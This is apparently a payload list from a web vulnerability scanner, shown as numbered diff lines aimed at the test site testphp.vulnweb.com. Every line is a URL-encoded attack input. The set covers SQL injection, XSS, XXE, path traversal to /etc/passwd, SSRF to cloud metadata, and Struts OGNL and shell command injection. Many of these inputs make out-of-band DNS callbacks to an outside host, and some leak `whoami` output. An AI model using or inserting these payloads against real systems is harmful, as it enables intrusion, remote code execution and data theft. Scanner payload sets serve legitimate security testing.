+    157 -1%27%3bexec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt7majuxr7xh_ggbwnvj2iguyinpzy0gm%27%2b%27hzw.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27)-- 
+    158 '%2BNSFTW%2B' 
+    159 javascript%3aABCtor(0x000012) 
+    160 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror.log 
+    161 ABCtor.com%2f%3fhttps%3a%2f%2ftestphp.vulnweb.com%2f 
+    162 (SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a) 
+    163 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror_log 
+    164 %2f%5cABCtor.com%2f%3ftestphp.vulnweb.com%2f 
+    165 %3cscRipt%3ens(0x000013)%3c%2fscRipt%3e 
+    166 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log 
+    167 %3c%25a%20style%3dx%3aexpre%2f**%2fssion(ABCtor(0x000014))%3e 
+    168 %2f%2f%2fABCtor.com%2f%3ftestphp.vulnweb.com%2f 
+    169 %3ciMg%20src%3d%22%2f%2fzqvil4-pt7uy3lf8kczphitsh4akkigx74cvfh3a8sg%26%2346%3bABCtor%26%2346%3bme%22%2f%3e 
+    170 %3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE%20r%20%5b%3c!ENTITY%20%25%20s%20%22php%3a%2f%2ffilter%2fread%3dconvert.base64-encode%2fresource%3dhttp%3a%2f%2fzqvil4-p%22%3e%3c!ENTITY%20%25%20d%20%22t77m0wdtqeaqbuqmrzwbj1joq4givq9sjiq.ABCtor.com%22%3e%3c!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3a%2f%2fABCtor.com%2fdtd%22%3e%20%20%25dtd%3b%5d%3e%3cr%3e%26a%3b%3c%2fr%3e 
+    171 127.0.0.1/trace.axd 
+    172 http://zqvil4-pt7xllvkm_uygkoyciek1d2c7s5ikw0nqc_b.ABCtor.com/p/ 
+    173 %7cexpr%24%7bIFS%7d268409241%24%7bIFS%7d-%24%7bIFS%7d75678 
+    174 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log 
+    175 %3ciframe%20src%3d%22http%3a%2f%2fABCtor.com%2f%3f%22%3e%3c%2fiframe%3e 
+    176 n%3bns%3aexpression(ABCtor(0x000015))%3b 
+    177 http://testphp.vulnweb.com/elmah.axd 
+    178 1)%20exec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt7yl5r6xbzlifzt1n4qfa6roglk_kkmm%27%2b%2737y.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27)-- 
+    179 arguments%5b1%5d.end(require(%27child_process%27).execSync(%27set%20%2fA%20268409241%20-%2061062%27)) 
+    180 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion 
+    181 testphp.vulnweb.com.ABCtor.com%2f%3f 
+    182 body%7bx%3aexpression(ABCtor(0x000016))%7d 
+    183 *%2fABCtor(0x000017)%3b%2f* 
+    184 1%27)exec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt755tkz6cgbwra6hr-pq6elbuvgx9k7h%27%2b%27eka.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27)-- 
+    185 http%3a%2f%2ftestphp.vulnweb.com.ABCtor.com%2f%3f 
+    186 -1%27%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 
+    187 gethostbyname(trim(%27zqvil4-pt7ozyecxcyptahh9lrbems_ate3pwnlt%27.%27h4c.ABCtor.com%27)) 
+    188 %27%2bABCtor(0x000018)%2b%27 
+    189 %3cfRame%20src%3d%22%2f%2fzqvil4-pt74hbj8p9fh7dw7ptu2sd0hdtwehu-tcs28%26%2346%3bABCtor%26%2346%3bme%22%3e%3c%2ffRame%3e 
+    190 https%3a%2f%2ftestphp.vulnweb.com.ABCtor.com%2f%3f 
+    191 %3cscRipt%20src%3d%22data%3a%3bbase64%2cbD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7bC5yZWw9InByZWZldGNoIjtsLmhyZWY9Ii8venF2aWw0LXB0N3lsbXR1bG1ldHgzczdsZ3lhdXF0dHp4cWg3Ymx1diIrIl9xaS5yODcubWUvci8%2fIitsb2NhdGlvbi5ocmVmO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobCk%3d%22%3e%3c%2fscRipt%3e 
+    192 testphp.vulnweb.com/elmah.axd 
+    193 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php 
+    194 %25%7b%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.addHeader(%22a%22%2c268409241-25519)%7d 
+    195 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd 
+    196 176.28.50.165/elmah.axd 
+    197 127.100.11.2/elmah.axd 
+    198 file%3a%2f%2f%2fetc%2fpasswd 
+    199 000177.000.00000.000001/trace.axd 
+    200 ::1/elmah.axd 
+    201 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 
+    202 0177.0.0.1/trace.axd 
+    203 127.0.0.1/elmah.axd 
+    204 0177.0.1/trace.axd 
+    205 0177.1/trace.axd 
+    206 http://testphp.vulnweb.com/elmah 
+    207 %22%2bABCtor(0x000019)%2b%22 
+    208 %22%3bl%3ddocument.createElement(%22link%22)%3bl.rel%3d%22prefetch%22%3bl.href%3d%22%2f%2fzqvil4-pt7j2rsjp1kfjzgzucivsvgm2kun3eibd%22%2b%22lyg.ABCtor.com%2fr%2f%3f%22%2blocation.href%3bdocument.head.appendChild(l)%3b%2f%2f 
+    209 017700000001/trace.axd 
+    210 php://filter//resource=http://zqvil4-pt79503q5mxp_sdto2jqlepudrpiivbxuajl.ABCtor.com/p/ 
+    211 testphp.vulnweb.com/elmah 
+    212 zqvil4-pt7eljdwmquhdjplheb5qadgag5p884eqcvr.ABCtor.com/p/ 
+    213 %27%3bl%3ddocument.createElement(%22link%22)%3bl.rel%3d%22prefetch%22%3bl.href%3d%22%2f%2fzqvil4-pt739tcravn61eqdoy3towcx_wu9dos4w%22%2b%2283c.ABCtor.com%2fr%2f%3f%22%2blocation.href%3bdocument.head.appendChild(l)%3b%2f%2f 
+    214 0x7f.0.0.1/trace.axd 
+    215 %5c%27%3bABCtor(0x00001A)%3b%2f%2f%2f 
+    216 1))exec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt7wrksd5nlafyo2hee13vnnuzsy_tg9c%27%2b%273bk.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27)-- 
+    217 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.php 
+    218 -1%5c%27%2b(select%201%20and%20row(1%2c1)%3e(select%20count(*)%2cconcat(CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))%2c0x3a%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201))--%201 
+    219 0x7f.0.1/trace.axd 
+    220 176.28.50.165/elmah 
+    221 1%20procedure%20analyse(extractvalue(rand()%2cconcat(0x3a%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))))%2c1)--%201 
+    222 0x7f.1/trace.axd 
+    223 127.100.11.2/elmah 
+    224 gethostbyname(trim(%27zqvil4-pt7b0frqnntz_pre9r4ffvx5dnxjogbo-%27.%27n_c.ABCtor.com%27))%3b 
+    225 ::1/elmah 
+    226 127.0.0.1/elmah 
+    227 ...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2fetc%2fpasswd 
+    228 1%27))exec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt7xlb91j_onbn6jafmfozkdj2ch52r1m%27%2b%27npk.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27)-- 
+    229 http://aws.ABCtor.com/latest/meta-data/public-hostname 
+    230 ....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd 
+    231 (length(CTXSYS.DRITHSX.SN(user%2c(select%20chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97)%20from%20DUAL)))) 
+    232 %2bgethostbyname(trim(%27zqvil4-pt76dlsae-rvc_egc8msmqx6zwngwoans%27.%27l2w.ABCtor.com%27))%3b%2f%2f 
+    233 %26%2339%3b%2cABCtor(0x00001D)%2c%26%2339%3b 
+    234 0x7f000001/trace.axd 
+    235 %27%7c%7cCTXSYS.DRITHSX.SN(user%2c(select%20chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97)%20from%20DUAL))%7c%7c%27 
+    236 %27%2bgethostbyname(trim(%27zqvil4-pt7vkz0d2v_bbw2ycqk67ycwpvcv_fgv8%27.%27cgo.ABCtor.com%27))%2b%27 
+    237 %27%2bconvert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%2b%27 
+    238 127.0.1/trace.axd 
+    239 127.1/trace.axd 
+    240 -1%2527%2band%2b6%253d3%2bor%2b1%253d1%252b(SELECT%2b1%2band%2bROW(1%252c1)%253e(SELECT%2bCOUNT(*)%252cCONCAT(CHAR(95)%252cCHAR(33)%252cCHAR(64)%252cCHAR(52)%252cCHAR(100)%252cCHAR(105)%252cCHAR(108)%252cCHAR(101)%252cCHAR(109)%252cCHAR(109)%252cCHAR(97)%252c0x3a%252cFLOOR(RAND(0)*2))x%2bFROM%2bINFORMATION_SCHEMA.COLLATIONS%2bGROUP%2bBY%2bx)a)%252b%2527 
+    241 .....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2fetc%2fpasswd 
+    242 http://169.254.169.254/latest/meta-data/public-hostname 
+    243 syscolumns%20WHERE%202%3e3%3bexec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt7mn1_gl7hjsqq5fm85xq6_usakebqzx%27%2b%279sy.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27)-- 
+    244 %22%2bgethostbyname(trim(%27zqvil4-pt7l0hbybcn2vhiqe76lsjpxmxnz39uau%27.%27x54.ABCtor.com%27))%2b%22 
+    245 DECLARE%20%40q%20varchar(999)%2c%40r%20nvarchar(999)SET%20%40q%20%3d%20%27SELECT%20*%20FROM%20OPENROWSET(%27%27SQLOLEDB%27%27%2c%27%27%40%27%27%3b%27%27a%27%27%3b%27%271%27%27%2c%27%27SELECT%201%27%27)%27SET%20%40r%3dreplace(%40q%2c%27%40%27%2c%27zqvil4-pt7xjacv5a4q24epwet-qdvatby4upbkp%27%2b%27gr8.ABCtor.com%27)exec%20sp_executesql%20%40r 
+    246 http%3a%2f%2f127.0.0.1%3a22 
+    247 1%3bDECLARE%20%40q%20varchar(999)%2c%40r%20nvarchar(999)SET%20%40q%20%3d%20%27SELECT%20*%20FROM%20OPENROWSET(%27%27SQLOLEDB%27%27%2c%27%27%40%27%27%3b%27%27a%27%27%3b%27%271%27%27%2c%27%27SELECT%201%27%27)%27SET%20%40r%3dreplace(%40q%2c%27%40%27%2c%27zqvil4-pt7w8fgs4kyuops5ttd5bh6ef1fb6pkzc%27%2b%27ffa.ABCtor.com%27)exec%20sp_executesql%20%40r-- 
+    248 http%3a%2f%2f176.28.50.165%3a22 
+    249 http%3a%2f%2f%3a%3a1%3a22 
+    250 http%3a%2f%2f127.0.0.1%3a3306 
+    251 %20ABCtor(0x000051)%20 
+    252 .%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2fetc%2fpasswd 
+    253 %3c%3f%20gethostbyname(trim(%27zqvil4-pt7yoz0njtznczk6lx_gxyrgqbhst9is1%27.%27i70.ABCtor.com%27))%3b%2f%2f%3f%3e 
+    254 %27%7b%24%7bgethostbyname(trim(%27zqvil4-pt7rlcqqh_6fu5zb4qoqi4kc8unxeompy%27.%27c80.ABCtor.com%27))%7d%7d%27 
+    255 16777343/trace.axd 
+    256 %0aABCtor(0x000086)%3b 
+    257 query%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd 
+    258 http%3a%2f%2f176.28.50.165%3a3306 
+    259 http%3a%2f%2f%3a%3a1%3a3306 
+    260 %2fetc%2fpasswd 
+    261 000260.0034.000062.00000245/trace.axd 
+    262 %26%2339%3b%2bABCtor(0x000088)%2b%26%2339%3b 
+    263 %252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd 
+    264 data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1 
+    265 search.php 
+    266 -1%27%3bDECLARE%20%40q%20varchar(999)%2c%40r%20nvarchar(999)SET%20%40q%20%3d%20%27SELECT%20*%20FROM%20OPENROWSET(%27%27SQLOLEDB%27%27%2c%27%27%40%27%27%3b%27%27a%27%27%3b%27%271%27%27%2c%27%27SELECT%201%27%27)%27SET%20%40r%3dreplace(%40q%2c%27%40%27%2c%27zqvil4-pt7grggawfomdjpzpsvucpemavgixyz08%27%2b%27exm.ABCtor.com%27)exec%20sp_executesql%20%40r-- 
+    267 createobject(%22WScript.Shell%22).exec(%22nslookup%20zqvil4-pt71vcfokbaxkihrbsykewyjzun1envlq%22%20%26%20%22rjg.ABCtor.com%22).StdOut.ReadAll 
+    268 http%3a%2f%2ftestphp.vulnweb.com%2fserver-status 
+    269 0260.1847973/trace.axd 
+    270 SELECT%20dblink_connect(%27host%3dzqvil4-pt7dks06rveyngsq0izjisskqybrw1ued%27%7c%7c%27am8.ABCtor.com%20user%3da%20password%3da%20connect_timeout%3d2%27) 
+    271 dblink_connect(%27host%3dzqvil4-pt7itmawufclejgj_i3-alshkax9oxieg%27%7c%7c%27i44.ABCtor.com%20user%3da%20password%3da%20connect_timeout%3d2%27) 
+    272 '%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3EABCtor(0x0000B4)%3C/scRipt%3E 
+    273 0260.28.12965/trace.axd 
+    274 search.php%00 
+    275 cast((SELECT%20dblink_connect(%27host%3dzqvil4-pt7kpcmyurwle5il_bor0gnp-iq_l8asv%27%7c%7c%27l_k.ABCtor.com%20user%3da%20password%3da%20connect_timeout%3d2%27))%20as%20numeric) 
+    276 %2522%252bABCtor(0x0000CB)%252b%2522 
+    277 0260.28.50.165/trace.axd 
+    278 %2fsearch.php 
+    279 %2bcreateobject(%22WScript.Shell%22).exec(%22nslookup%20zqvil4-pt7rw-xqreb72wli5dnhwn9t0ldiucqyo%22%20%26%20%22uiw.ABCtor.com%22).StdOut.ReadAll 
+    280 026007031245/trace.axd 
+    281 cast((SELECT%20dblink_connect(chr(104)%7c%7cchr(111)%7c%7cchr(115)%7c%7cchr(116)%7c%7cchr(61)%7c%7cchr(122)%7c%7cchr(113)%7c%7cchr(118)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(52)%7c%7cchr(45)%7c%7cchr(112)%7c%7cchr(116)%7c%7cchr(55)%7c%7cchr(102)%7c%7cchr(104)%7c%7cchr(109)%7c%7cchr(104)%7c%7cchr(121)%7c%7cchr(115)%7c%7cchr(117)%7c%7cchr(119)%7c%7cchr(101)%7c%7cchr(120)%7c%7cchr(113)%7c%7cchr(111)%7c%7cchr(53)%7c%7cchr(106)%7c%7cchr(104)%7c%7cchr(105)%7c%7cchr(111)%7c%7cchr(118)%7c%7cchr(103)%7c%7cchr(105)%7c%7cchr(54)%7c%7cchr(116)%7c%7cchr(102)%7c%7cchr(121)%7c%7cchr(103)%7c%7cchr(121)%7c%7cchr(111)%7c%7cchr(98)%7c%7cchr(99)%7c%7cchr(114)%7c%7cchr(109)%7c%7cchr(114)%7c%7cchr(107)%7c%7cchr(46)%7c%7cchr(114)%7c%7cchr(56)%7c%7cchr(55)%7c%7cchr(46)%7c%7cchr(109)%7c%7cchr(101)%7c%7cchr(32)%7c%7cchr(117)%7c%7cchr(115)%7c%7cchr(101)%7c%7cchr(114)%7c%7cchr(61)%7c%7cchr(97)%7c%7cchr(32)%7c%7cchr(112)%7c%7cchr(97)%7c%7cchr(115)%7c%7cchr(115)%7c%7cchr(119)%7c%7cchr(111)%7c%7cchr(114)%7c%7cchr(100)%7c%7cchr(61)%7c%7cchr(97)%7c%7cchr(32)%7c%7cchr(99)%7c%7cchr(111)%7c%7cchr(110)%7c%7cchr(110)%7c%7cchr(101)%7c%7cchr(99)%7c%7cchr(116)%7c%7cchr(95)%7c%7cchr(116)%7c%7cchr(105)%7c%7cchr(109)%7c%7cchr(101)%7c%7cchr(111)%7c%7cchr(117)%7c%7cchr(116)%7c%7cchr(61)%7c%7cchr(50)))%20as%20numeric) 
+    282 %5csearch.php 
+    283 0xb0.1847973/trace.axd 
+    284 %3chtml%20xmlns%3d%22http%3a%2f%2fwww.w3.org%2f1999%2fxhtml%22%3e%3cscript%3eABCtor(0x0000D2)%3c%2fscript%3e%3c%2fhtml%3e 
+    285 0xb0.28.12965/trace.axd 
+    286 0xb0.28.50.165/trace.axd 
+    287 %2bcreateobject(%22WScript.Shell%22).exec(%22nslookup%20zqvil4-pt7o7w2w2m7vx_2y7kpcesitkxvhtliid%22%20%26%20%220es.ABCtor.com%22).StdOut.ReadAll%2b 
+    288 %2f%2fABCtor.com%2f%3f0x0000D3 
+    289 WEB-INF%2fweb.xml 
+    290 0xb01c32a5/trace.axd 
+    291 176.1847973/trace.axd 
+    292 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml 
+    293 %27%7c%7c(SELECT%20dblink_connect(%27host%3dzqvil4-pt7hp9lmwkp_o7cgz8gky5czujpxh7m1c%27%7c%7c%27dhu.ABCtor.com%20user%3da%20password%3da%20connect_timeout%3d2%27))%7c%7c%27 
+    294 176.28.12965/trace.axd 
+    295 (select%20UTL_INADDR.GET_HOST_ADDRESS(%27zqvil4-pt77yq3-990s-deocofqvgj1cefyycwkg%27%7c%7c%27w-c.ABCtor.com%27)%20from%20DUAL) 
+    296 %3c%25createobject(%22WScript.Shell%22).exec(%22nslookup%20zqvil4-pt7iq2-5yvc1it10uhu5nzs4m6c1zp__e%22%20%26%20%22ely.ABCtor.com%22).StdOut.ReadAll%25%3e 
+    297 %3ca%20HrEf%3dJaVaScRiPt%3aABCtor(0x0000D9)%3e 
+    298 %22%2bcreateobject(%22WScript.Shell%22).exec(%22nslookup%20zqvil4-pt70qq9pniaw_u_hwl2ilbtb16vpzsas5%22%20%26%20%22xuc.ABCtor.com%22).StdOut.ReadAll%2b%22 
+    299 (length(CTXSYS.DRITHSX.SN(user%2c(select%20UTL_INADDR.GET_HOST_ADDRESS(%27zqvil4-pt7qd95gjzcqpyrjvdlumjw5gqxt-fyvj%27%7c%7c%27j0y.ABCtor.com%27)%20from%20DUAL)))) 
+    300 2771524784/trace.axd 
+    301 gethostbyname(lc%20%27zqvil4-pt7hmjbkt4mllzixyj24qxvozk9eqfbjs%27.%27fhy.ABCtor.com%27) 
+    302 %27%7c%7cCTXSYS.DRITHSX.SN(user%2c(select%20UTL_INADDR.GET_HOST_ADDRESS(%27zqvil4-pt7j8p9xk_vaqajrcilsiz0j1ocqsdkjh%27%7c%7c%27b5a.ABCtor.com%27)%20from%20DUAL))%7c%7c%27 
+    303 eval(%27gethostbyname(lc%20%27zqvil4-pt73eybrysrywyv--ullldtbv1brwgl2u%27.%276_0.ABCtor.com%27)%27) 
+    304 (select%20UTL_INADDR.GET_HOST_ADDRESS(chr(122)%7c%7cchr(113)%7c%7cchr(118)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(52)%7c%7cchr(45)%7c%7cchr(112)%7c%7cchr(116)%7c%7cchr(55)%7c%7cchr(111)%7c%7cchr(109)%7c%7cchr(53)%7c%7cchr(50)%7c%7cchr(121)%7c%7cchr(115)%7c%7cchr(108)%7c%7cchr(110)%7c%7cchr(56)%7c%7cchr(56)%7c%7cchr(112)%7c%7cchr(55)%7c%7cchr(98)%7c%7cchr(122)%7c%7cchr(114)%7c%7cchr(109)%7c%7cchr(110)%7c%7cchr(106)%7c%7cchr(113)%7c%7cchr(48)%7c%7cchr(108)%7c%7cchr(111)%7c%7cchr(99)%7c%7cchr(110)%7c%7cchr(104)%7c%7cchr(108)%7c%7cchr(45)%7c%7cchr(121)%7c%7cchr(114)%7c%7cchr(105)%7c%7cchr(107)%7c%7cchr(106)%7c%7cchr(52)%7c%7cchr(46)%7c%7cchr(114)%7c%7cchr(56)%7c%7cchr(55)%7c%7cchr(46)%7c%7cchr(109)%7c%7cchr(101))%20from%20DUAL) 
+    305 (length(CTXSYS.DRITHSX.SN(user%2c(select%20UTL_INADDR.GET_HOST_ADDRESS(chr(122)%7c%7cchr(113)%7c%7cchr(118)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(52)%7c%7cchr(45)%7c%7cchr(112)%7c%7cchr(116)%7c%7cchr(55)%7c%7cchr(121)%7c%7cchr(53)%7c%7cchr(122)%7c%7cchr(116)%7c%7cchr(104)%7c%7cchr(120)%7c%7cchr(110)%7c%7cchr(102)%7c%7cchr(114)%7c%7cchr(118)%7c%7cchr(111)%7c%7cchr(118)%7c%7cchr(113)%7c%7cchr(56)%7c%7cchr(108)%7c%7cchr(98)%7c%7cchr(106)%7c%7cchr(103)%7c%7cchr(121)%7c%7cchr(95)%7c%7cchr(107)%7c%7cchr(112)%7c%7cchr(97)%7c%7cchr(100)%7c%7cchr(118)%7c%7cchr(105)%7c%7cchr(114)%7c%7cchr(122)%7c%7cchr(105)%7c%7cchr(106)%7c%7cchr(111)%7c%7cchr(111)%7c%7cchr(115)%7c%7cchr(46)%7c%7cchr(114)%7c%7cchr(56)%7c%7cchr(55)%7c%7cchr(46)%7c%7cchr(109)%7c%7cchr(101))%20from%20DUAL)))) 
+    306 %27%7c%7cCTXSYS.DRITHSX.SN(user%2c(select%20UTL_INADDR.GET_HOST_ADDRESS(chr(122)%7c%7cchr(113)%7c%7cchr(118)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(52)%7c%7cchr(45)%7c%7cchr(112)%7c%7cchr(116)%7c%7cchr(55)%7c%7cchr(56)%7c%7cchr(113)%7c%7cchr(101)%7c%7cchr(105)%7c%7cchr(100)%7c%7cchr(117)%7c%7cchr(116)%7c%7cchr(101)%7c%7cchr(111)%7c%7cchr(118)%7c%7cchr(99)%7c%7cchr(106)%7c%7cchr(120)%7c%7cchr(102)%7c%7cchr(116)%7c%7cchr(110)%7c%7cchr(98)%7c%7cchr(99)%7c%7cchr(107)%7c%7cchr(97)%7c%7cchr(95)%7c%7cchr(103)%7c%7cchr(108)%7c%7cchr(120)%7c%7cchr(119)%7c%7cchr(101)%7c%7cchr(104)%7c%7cchr(110)%7c%7cchr(108)%7c%7cchr(117)%7c%7cchr(104)%7c%7cchr(118)%7c%7cchr(105)%7c%7cchr(46)%7c%7cchr(114)%7c%7cchr(56)%7c%7cchr(55)%7c%7cchr(46)%7c%7cchr(109)%7c%7cchr(101))%20from%20DUAL))%7c%7c%27 
+    307 query%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(1))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(1))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(1))A)))OR%22*%2f 
+    308 %27%2bgethostbyname(lc%20%27zqvil4-pt7ahtdaxsj910u56qh2_exgblpr4nfcb%27.%27oi0.ABCtor.com%27)%2b%27 
+    309 %22%2bgethostbyname(lc%20%27zqvil4-pt7kqrj0ud6w9ljgsnmcnvxyqvtlv8ckz%27.%27rvs.ABCtor.com%27)%2b%22 
+    310 %20nslookup%20zqvil4-pt7ujj2_351mxcx4ostocoolt1h8gvjnf%5eogy.ABCtor.com%26%27%5c%22%600%26nslookup%20zqvil4-pt7ujj2_351mxcx4ostocoolt1h8gvjnf%5eogy.ABCtor.com%26%60%27 
+    311 query%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(30))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(30))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(30))A)))OR%22*%2f 
+    312 %26%20nslookup%20zqvil4-pt7vuxxwglwrw0oyh0f-iz0m6c8pvtwqj%5esvk.ABCtor.com%26%27%5c%22%600%26nslookup%20zqvil4-pt7vuxxwglwrw0oyh0f-iz0m6c8pvtwqj%5esvk.ABCtor.com%26%60%27 
+    313 %27%26%20nslookup%20zqvil4-pt7aiouh9pzkcc5kxikn8dxnkbrbxfl-d%5edks.ABCtor.com%26%27%5c%22%600%26nslookup%20zqvil4-pt7aiouh9pzkcc5kxikn8dxnkbrbxfl-d%5edks.ABCtor.com%26%60%27 
+    314 %22%26%20nslookup%20zqvil4-pt7dzlehoanu2h_yebpbkft8s-wp6tr3e%5eftk.ABCtor.com%26%27%5c%22%600%26nslookup%20zqvil4-pt7dzlehoanu2h_yebpbkft8s-wp6tr3e%5eftk.ABCtor.com%26%60%27 
+    315 nslookup%20%22zqvil4-pt7fxikkwjevofqjjd02xovrdawqw9eot%22%22eo0.ABCtor.com%22 
+    316 %26nslookup%20%22zqvil4-pt7s0dzwdgcxgz2gjwvrdwhrhdnsgkvmk%22%22h-w.ABCtor.com%22 
+    317 %27%26nslookup%20%22zqvil4-pt7n9i5lxusedkhgi5xtpzh6dbv2-nv13%22%22phk.ABCtor.com%22 
+    318 %22%26nslookup%20%22zqvil4-pt7igbs4m37iebunwhnkysfwn6yx4zhbi%22%22rjg.ABCtor.com%22 
+    319 %7cnslookup%24%7bIFS%7d%22zqvil4-pt71iox3ivi1d-otnn9_wswbgldz2hdc-%22%22mwu.ABCtor.com%22 
+    320 %25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27nslookup%20%60whoami%60.%22zqvil4-pt7k5euulfsjtxpf3_pingmmn-yqe_0fc%22%22ciq.ABCtor.com%22%27).(%23p%3dnew%20java.lang.ProcessBuilder(%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d 
+    321 %25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27nslookup%20%22zqvil4-pt7adyvink-8wre4uw0dmsun_n64alpde%22o_w.ABCtor.com%22%27).(%23p%3dnew%20java.lang.ProcessBuilder(%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d 
